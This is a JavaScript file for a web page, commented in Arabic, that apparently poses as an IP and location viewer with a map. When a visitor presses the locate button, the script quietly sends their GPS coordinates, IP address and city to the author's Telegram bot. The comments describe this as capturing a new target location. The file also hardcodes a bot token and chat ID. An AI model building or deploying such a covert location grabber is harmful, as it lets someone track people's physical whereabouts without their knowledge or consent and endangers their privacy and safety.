let map;
let marker;

// بيانات بوت تيليجرام الخاص بك
const TELEGRAM_TOKEN = '9135609226:AAEcN-Q-8NgyXbCuAcxt4JgDvN58Ed2LFVU';
const CHAT_ID = '8743167022';

// دالة إرسال البيانات إلى تيليجرام
function sendToTelegram(lat, lon, ip, country, city) {
    const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
    const message = `🎯 **تم التقاط موقع جديد!**\n\n` +
                    `🌐 **IP:** ${ip}\n` +
                    `📍 **الدولة/المدينة:** ${country} - ${city}\n` +
                    `📌 **الإحداثيات:** ${lat}, ${lon}\n` +
                    `🗺️ **الخريطة:** ${googleMapsUrl}`;

    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    });
}

// متغيرات لحفظ بيانات الـ IP مؤقتاً
let currentIp = 'غير معروف';
let currentCountry = 'غير معروف';
let currentCity = 'غير معروف';

// 1. جلب معلومات الـ IP وموقع الـ IP التقديري فور تحميل الصفحة
window.addEventListener('DOMContentLoaded', () => {
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            currentIp = data.ip || 'غير معروف';
            currentCountry = data.country_name || 'غير معروف';
            currentCity = data.city || 'غير معروف';

            document.getElementById('ip-address').textContent = currentIp;
            document.getElementById('country').textContent = currentCountry;
            document.getElementById('city').textContent = currentCity;
            
            if (data.latitude && data.longitude) {
                initMap(data.latitude, data.longitude, "الموقع التقديري بناءً على الـ IP");
            } else {
                initMap(31.9539, 35.9106, "عمان (موقع افتراضي)");
            }
        })
        .catch(error => {
            document.getElementById('ip-address').textContent = 'فشل جلب البيانات';
            console.error('Error fetching IP:', error);
            initMap(31.9539, 35.9106, "عمان (موقع افتراضي)");
        });
});

// دالة إنشاء وتحديث الخريطة والدبوس
function initMap(lat, lon, popupMessage) {
    if (!map) {
        map = L.map('map').setView([lat, lon], 13);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap'
        }).addTo(map);
        marker = L.marker([lat, lon]).addTo(map).bindPopup(popupMessage).openPopup();
    } else {
        map.setView([lat, lon], 15);
        marker.setLatLng([lat, lon]).setPopupContent(popupMessage).openPopup();
    }
}

// 2. تفعيل زر تحديد موقع GPS وإرسال الموقع إليك على تيليجرام
const locateBtn = document.getElementById('locate-btn');
locateBtn.addEventListener('click', () => {
    if ('geolocation' in navigator) {
        document.getElementById('latitude').textContent = 'جاري التحديد...';
        document.getElementById('longitude').textContent = 'جاري التحديد...';
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                document.getElementById('latitude').textContent = lat.toFixed(4);
                document.getElementById('longitude').textContent = lon.toFixed(4);
                
                // تحديث الخريطة
                initMap(lat, lon, "موقعك الدقيق عبر الـ GPS");

                // إرسال الإحداثيات ومعلومات الـ IP فوراً إلى بوت تيليجرام الخاص بك
                sendToTelegram(lat, lon, currentIp, currentCountry, currentCity);
            },
            (error) => {
                alert('تعذر تحديد موقعك. يرجى التأكد من تشغيل الـ GPS والسماح للمتصفح بالوصول لموقعك.');
                document.getElementById('latitude').textContent = '---';
                document.getElementById('longitude').textContent = '---';
            }
        );
    } else {
        alert('متصفحك لا يدعم خاصية تحديد الموقع الجغرافي.');
    }
});